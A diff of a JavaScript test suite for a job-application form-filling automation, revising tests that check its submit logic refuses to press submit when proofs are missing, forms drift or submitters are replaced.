   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 2);
 });
@@ -3154,17 +6028,19 @@ test('v4 keeps proof handles valid across a same-document history hash update', 
   assertScriptInterceptedNativeTransport(result);
 });
 
-test('v4 fails closed for a script-handled shadow-root form under native-only transport', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4(
+test('v4 retains shadow-root proofs but fails closed without a supported native submit witness', async () => {
+  const { status, result, clicks: recorded } = await runV4(
     '/shadow-bare-send',
     minimalV4Fills('#shadow-email', '#shadow-resume')
   );
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
-  assertScriptInterceptedNativeTransport(result);
-  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
-  assert.equal(result.exactPageUrlProof.beforeSubmit, result.exactPageUrlProof.expected);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation, null);
+  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(result.finalSubmitChooser.candidateCount, 0);
+  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
+  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
 });
 
 test('v4 refuses bare Send when this run also successfully populated an unrelated form', async () => {
@@ -3177,6 +6053,18 @@ test('v4 refuses bare Send when this run also successfully populated an unrelate
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 2);
+});
+
+test('v4 refuses explicit application submit when every successful action landed in another form', async () => {
+  const run = await runV4('/explicit-submit-only-unrelated-proof', [
+    { type: 'fill', selector: '#unrelated-email', value: 'applicant@example.com', label: 'email' }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(run.result.finalSubmitChooser.addressedScopeCount, 1);
+  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
 });
 
 test('v4 ignores forged successful-address attributes and clicks nothing', async () => {
@@ -3251,16 +6139,17 @@ test('v4 returned fingerprints do not expose deterministic submitted values', as
   );
 });
 
-test('v4 blocks an initially over-bound submitted-control inventory', async () => {
-  const { status, result, clicks: recorded } = await runV4('/over-bound-submitted-state', [
-    ...minimalV4Fills('#bound-email', '#bound-resume'),
-    { type: 'click', selector: '#arm-bound' }
-  ]);
+test('v4 blocks an isolated activation inventory that exceeds 512 controls', async () => {
+  const { status, result, clicks: recorded, requests } = await runV4(
+    '/over-bound-submitted-state', minimalV4Fills('#bound-email', '#bound-resume')
+  );
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
   assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.match(result.requiredFieldConfirmation.passes[0].unresolved.join('\n'), /submitted controls/);
+  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
+  assert.equal(result.requiredFieldConfirmation, null);
 });
 
 test('v4 requires two distinct successful controls, not two uploads to one resume', async () => {
@@ -3316,33 +6205,39 @@ test('v4 refuses a submit-capable selected custom choice during confirmation', a
 
 for (const variant of ['bare', 'explicit']) {
   test('v4 direct handles refuse late ' + variant + ' submitter reparenting', async () => {
-    const { status, result, clicks: recorded } = await runV4(
+    const { status, result, clicks: recorded, requests } = await runV4(
       '/late-' + variant + '-reparent', minimalV4Fills('#late-email', '#late-resume')
     );
     assert.equal(status, 0);
     assert.deepEqual(recorded, []);
+    assert.deepEqual(requests, []);
     assert.equal(result.submitOutcome.pressed, false);
+    assert.ok(result.requiredFieldConfirmation, JSON.stringify(result));
     assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_chooser_changed');
+    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_node_replaced');
+    assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
   });
 }
 
 test('v4 fails closed when a genuinely formless application has no caller-bound form', async () => {
   const { status, result, clicks: recorded, requests } = await runV4('/ashby');
-  assert.equal(status, 0);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'application_scope_invalid');
+  assert.equal(status, 1);
+  assert.equal(result, null);
   assert.deepEqual(recorded, []);
   assert.deepEqual(requests, []);
 });
 
 test('v4 preserves explicit native submitter override semantics', async () => {
-  const { status, result, clicks: recorded } = await runV4(
+  const { status, result, clicks: recorded, requests } = await runV4(
     '/workable-explicit-override', workableV4Fills()
   );
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assertScriptInterceptedNativeTransport(result, 'submit_request_unobserved', 'activation_blocked');
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
+  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
   assert.equal(result.finalSubmitChooser.topScore, 3);
 });
 
@@ -3386,7 +6281,7 @@ test('v4 accepts successful controls externally associated with the application 
 });
 
 for (const semantics of ['base', 'method']) {
-  test('v4 invalidates successful proofs after pre-chooser form ' + semantics + ' drift', async () => {
+  test('v4 blocks pre-chooser form ' + semantics + ' drift at the native binding boundary', async () => {
     const { status, result, clicks: recorded } = await runV4(
       '/pre-chooser-' + semantics + '-drift',
       [
@@ -3396,9 +6291,8 @@ for (const semantics of ['base', 'method']) {
     );
     assert.equal(status, 0);
     assert.deepEqual(recorded, []);
-    assert.equal(result.submitOutcome.pressed, false);
-    assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-    assert.equal(result.finalSubmitChooser.addressedScopeCount, 0);
+    assertScriptInterceptedNativeTransport(result);
+    assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
   });
 }
 
@@ -3462,8 +6356,30 @@ test('v3 private failed-choice authority survives removal of its legacy marker m
   assert.match(result.requiredFieldConfirmation.passes[0].unresolved.join('\n'), /choice this run could not/);
 });
 
-test('v4 keeps a detached whole-form failed choice as a global refusal', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4('/whole-form-failed-choice', [
+test('v3 ignores a detached failed choice that belonged to an unrelated form', async () => {
+  const { status, result, clicks: recorded } = await run(
+    '/v3-detached-unrelated-failed-choice',
+    [],
+    [
+      ...minimalV4Fills('#v3-cross-email', '#v3-cross-resume'),
+      {
+        type: 'fillByLabelText',
+        text: 'Secondary preference',
+        value: 'Yes',
+        label: 'secondary_preference',
+        optional: true
+      },
+      { type: 'click', selector: '#remove-secondary' }
+    ]
+  );
+  assert.equal(status, 0);
+  assert.deepEqual(recorded, ['v3-application']);
+  assert.equal(result.submitOutcome.pressed, true);
+  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 keeps a detached whole-form failed choice as a terminal no-submit refusal', async () => {
+  const { status, result, clicks: recorded } = await runV4('/whole-form-failed-choice', [
     {
       type: 'fillByLabelText',
       text: 'Work authorization',
@@ -3475,12 +6391,11 @@ test('v4 keeps a detached whole-form failed choice as a global refusal', async (
   ]);
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation, null);
   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
-  assert.equal(result.exactPageUrlProof.beforeSubmit, null);
+  assert.equal(result.finalSubmitChooser.candidateCount, 0);
+  assert.match(result.skipped.join('\n'), /choice value did not persist/);
 });
 
 test('v4 blocks an empty required control externally associated with the form', async () => {
